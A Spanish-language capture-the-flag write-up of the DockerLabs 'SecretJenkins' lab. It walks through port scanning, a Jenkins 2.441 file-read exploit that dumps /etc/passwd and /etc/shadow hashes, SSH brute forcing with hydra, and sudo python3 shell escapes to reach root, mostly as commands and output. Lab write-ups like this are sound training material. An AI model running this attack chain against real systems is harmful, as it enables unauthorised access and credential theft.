---
title: DockerLabs - SecretJenkins
summary: "Write-up del laboratorio SecretJenkins de DockerLabs"
author: elcybercurioso
date: 2025-11-04
categories: [Post, DockerLabs]
tags: [fácil, jenkins, lfi, brute force, privesc, sudo]
media_subpath: "/assets/img/posts/dockerlabs_secretjenkins"
image:
  path: main.webp
published: true
---

## nmap

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/SecretJenkins]
└─$ nmap -p- -sS --min-rate 5000 -v -n -Pn 172.17.0.2 -oG allPorts
PORT     STATE SERVICE
22/tcp   open  ssh
8080/tcp open  http-proxy
```

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/SecretJenkins]
└─$ nmap -sCV -p8080,22 172.17.0.2                                
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 94:fb:28:59:7f:ae:02:c0:56:46:07:33:8c:ac:52:85 (ECDSA)
|_  256 43:07:50:30:bb:28:b0:73:9b:7c:0c:4e:3f:c9:bf:02 (ED25519)
8080/tcp open  http    Jetty 10.0.18
|_http-title: Site doesn´t have a title (text/html;charset=utf-8).
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Jetty(10.0.18)
```

## análisis

Comenzamos revisando la pagina principal del puerto 8080 del laboratorio, donde nos encontramos que hay un Jenkins desplegado:

![Desktop View](/20251029151738.webp){: width="972" height="589" .shadow}

Los análisis con `nmap` nos indicaba que detrás hay un `Jetty Web Server`, por lo que buscamos alguna vulnerabilidad conocida:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/SecretJenkins]
└─$ searchsploit Jetty        
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                  |  Path
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
...
Jetty Web Server - Directory Traversal                                                                                                                                          | windows/remote/36318.txt
...
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Nos indican que deberíamos poder ver ficheros del servidor en caso de conocer las rutas completas.

Sin embargo, ahora mismo no conocemos ninguna ruta:

```bash
source: https://www.securityfocus.com/bid/50723/info

Jetty Web Server is prone to a directory-traversal vulnerability because it fails to sufficiently sanitize user-supplied input.

Exploiting this issue will allow an attacker to view arbitrary files within the context of the webserver. Information harvested may aid in launching further attacks.

http://www.example.com:9084/vci/downloads/.\..\..\..\..\..\..\..\Documents and Settings\All Users\Application Data\VMware\VMware VirtualCenter\SSL\rui.key
```

Pero, lo que podemos ver en la esquina derecha abajo es la versión de Jenkins desplegada:

![Desktop View](/20251029151927.webp){: width="320" height="180" .shadow}

## explotación

Buscamos vulnerabilidades que afecten a esta versión de Jenkins, y encontramos que es vulnerable a un LFI (Local File Inclusion):

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/SecretJenkins]
└─$ searchsploit Jenkins                    
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                  |  Path
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
...
Jenkins 2.441 - Local File Inclusion                                                                                                                                            | java/webapps/51993.py
...
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Indicando la URL del laboratorio, vemos que podemos leer ficheros del sistema como el `/etc/passwd`:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/SecretJenkins]
└─$ python3 exploit.py -u http://172.17.0.2:8080
Press Ctrl+C to exit
File to download:
> /etc/passwd
...
root:x:0:0:root:/root:/bin/bash
bobby:x:1001:1001::/home/bobby:/bin/bash
pinguinito:x:1002:1002::/home/pinguinito:/bin/bash
...
```

O el `/etc/shadow` incluso (lo que nos indica que el usuario que ha desplegado el servidor web tiene permisos privilegiados):

```bash
File to download:
> /etc/shadow
...
root:*:19732:0:99999:7:::
bobby:$y$j9T$WMW/12y8q31vknUetL2zA/$npFebwOYjDm5y/itia7nnZdhASN7yJ9l1YDjB/3but9:19854:0:99999:7:::
pinguinito:$y$j9T$AD4Tq.mVnQE9oR0j2ECGe0$hGXqaPc6e9fCcS6xYupdiR9OcmVjH6WmUKjz39ImCO9:19854:0:99999:7:::
...
```

Pero, tras intentar sacar las contraseñas de los usuarios por fuerza bruta de manera offline empleando la herramienta `unshadow` (a la que si le pasamos el contenido del fichero `/etc/passwd` y el del fichero `/etc/shadow`, el resultado se puede usar para obtener contraseñas), pero vemos que pasado cierto tiempo no obtenemos ninguna contraseña.

Por ello, pasamos a obtener la contraseña por fuerza bruta, pero para el servicio SSH empleando `hydra`:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/SecretJenkins]
└─$ hydra -l bobby -P /usr/share/seclists/Passwords/rockyou.txt ssh://172.17.0.2 -t 64 -I
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: bobby   password: ch*******
1 of 1 target successfully completed, 1 valid password found
```

Vemos que obtenemos la contraseña, por lo que podemos conectarnos por SSH:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/SecretJenkins]
└─$ ssh bobby@172.17.0.2                                                 
bobby@172.17.0.2's password: 
bobby@25846cf524ab:~$ whoami
bobby
bobby@25846cf524ab:~$ hostname -I 
172.17.0.2
```

## escalada de privilegios

Vemos que el usuario `bobby` tiene en sus permisos SUDO el poder ejecutar `python3` como el usuario `pinguinito`:

```bash
bobby@25846cf524ab:~$ sudo -l
Matching Defaults entries for bobby on 25846cf524ab:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User bobby may run the following commands on 25846cf524ab:
    (pinguinito) NOPASSWD: /usr/bin/python3
```

 Comprobamos en [GTFOBins](https://gtfobins.github.io/gtfobins/python/#sudo) que podemos obtener una consola como otro usuario empleando el siguiente comando:

![Desktop View](/20251029171935.webp){: width="972" height="589" .shadow}

```bash
sudo python3 -c 'import os; os.system("/bin/sh")'
```

Tras ejecutar el siguiente comando, nos habremos convertido en el usuario `pinguinito`:

```bash
bobby@25846cf524ab:~$ sudo -u pinguinito python3 -c 'import os; os.system("/bin/sh")'
$ whoami
pinguinito
```

Al ir a comprobar los permisos SUDO de este usuario también, encontramos que puede ejecutar el comando `/usr/bin/python3 /opt/script.py` como el usuario `root`:

```bash
pinguinito@25846cf524ab:/home/bobby$ sudo -l
Matching Defaults entries for pinguinito on 25846cf524ab:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User pinguinito may run the following commands on 25846cf524ab:
    (ALL) NOPASSWD: /usr/bin/python3 /opt/script.py
```

El contenido del script `/opt/script.py` nos revela que se encarga de realizar un copia del mismo fichero a la ubicación `/tmp/script_backup.py`:

```bash
pinguinito@25846cf524ab:/home/bobby$ cat /opt/script.py
import shutil

def copiar_archivo(origen, destino):
    shutil.copy(origen, destino)
    print(f'Archivo copiado de {origen} a {destino}')

if __name__ == '__main__':
    origen = '/opt/script.py'
    destino = '/tmp/script_backup.py'
    copiar_archivo(origen, destino)
```

Los permisos del script nos permite leerlo y ejecutarlo, pero no podamos editarlo. Sin embargo, lo que se puede hacer en estos casos es borrar y volver a crear el mismo fichero (en caso de tener permisos de escritura en la carpeta) con el contenido que queramos:

```bash
pinguinito@25846cf524ab:/home/bobby$ ls -la /opt/script.py
-r-xr--r-- 1 pinguinito root 272 May 11  2024 /opt/script.py
pinguinito@25846cf524ab:/home/bobby$ rm /opt/script.py
rm: remove write-protected regular file '/opt/script.py'? y
pinguinito@25846cf524ab:/home/bobby$ ls -la /opt/script.py
ls: cannot access '/opt/script.py': No such file or directory
```

De esta manera, tendremos el mismo fichero, pero modificado con el código que nos otorgará una nueva consola privilegiada:

```bash
pinguinito@25846cf524ab:/home/bobby$ cat /opt/script.py
import os; os.system('/bin/bash')
```

Tras ejecutar el comando SUDO del usuario, vemos que obtenemos la consola como el usuario `root`:

```bash
pinguinito@25846cf524ab:/home/bobby$ sudo /usr/bin/python3 /opt/script.py
root@25846cf524ab:/home/bobby# whoami
root
```

Y con esto concluiría la resolución de la máquina!

<a href="https://www.buymeacoffee.com/elcybercurioso" target="_blank"><img src="https://img.buymeacoffee.com/button-api/?text=Buy+me+a+coffee&emoji=&slug=elcybercurioso&button_colour=FFDD00&font_colour=000000&font_family=Cookie&outline_colour=000000&coffee_colour=ffffff" alt="buymecoffee_icon" /></a>

<script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="zweilosec" data-description="Support me on Buy me a coffee!" data-message="Gracias por tu visita! Un café me da las fuerzas para continuar!" data-color="#FFDD00" data-position="Right" data-x_margin="18" data-y_margin="18"></script>